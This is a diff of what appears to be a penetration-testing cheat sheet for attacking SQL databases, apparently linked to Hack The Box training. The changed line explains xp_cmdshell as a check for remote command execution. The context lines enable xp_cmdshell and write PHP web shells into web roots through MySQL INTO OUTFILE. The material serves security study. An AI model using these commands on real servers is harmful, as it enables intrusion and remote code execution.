@@ -49,7 +49,7 @@
 | `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
 | `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
 | `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
-| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
+| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server to test if successfully able to perform Remote Command Execution RCE on remote target through SQL syntax. [XP_CMDSHELL - Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169) |
 | `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
 | `mysql> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "C:\\xampp\\htdocs\\z.php"; ` | Write php webshell on a Windows target running XAMPP. |
 | `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
